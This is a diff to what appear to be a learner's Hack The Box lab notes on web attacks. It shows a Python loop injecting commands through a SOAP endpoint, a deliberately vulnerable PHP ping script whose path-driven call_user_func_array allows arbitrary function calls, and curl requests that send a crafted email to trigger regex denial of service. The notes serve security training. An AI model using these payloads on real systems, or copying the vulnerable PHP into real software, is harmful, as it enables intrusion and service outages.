@@ -74,3 +74,42 @@ while True:
     payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
     print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 ```
+
+# Command Injection
+```php
+<?php
+function ping($host_url_ip, $packets) {
+        if (!in_array($packets, array(1, 2, 3, 4))) {
+                die('Only 1-4 packets!');
+        }
+        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
+        $delimiter = "\n" . str_repeat('-', 50) . "\n";
+        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+        $prt = explode('/', $_SERVER['PATH_INFO']);
+        call_user_func_array($prt[1], array_slice($prt, 2));
+}
+?>
+```
+
+![[1 1.webp]]
+# Regular Expression Denial of Service (ReDoS)
+The API resides in `http://<TARGET IP>:3000/api/check-email` and accepts a parameter called _email_.
+```shell-session
+alakin2504@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
+{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
+```
+Submit the above regex to [regex101.com](https://regex101.com/) for an in-depth explanation. Then, submit the above regex to [https://jex.im/regulex/](https://jex.im/regulex/#!flags=&re=%5E\(%5Ba-zA-Z0-9_.-%5D\)%2B%40\(\(%5Ba-zA-Z0-9-%5D\)%2B.\)%2B\(%5Ba-zA-Z0-9%5D%7B2%2C4%7D\)%2B%24) for a visualization.
+
+![image](https://academy.hackthebox.com/storage/modules/160/TXFOUkOko.png)
+
+The second and third groups are doing bad iterative checks.
+
+Let's submit the following valid value and see how long the API takes to respond.
+
+```shell-session
+alakin2504@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
+{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
+```
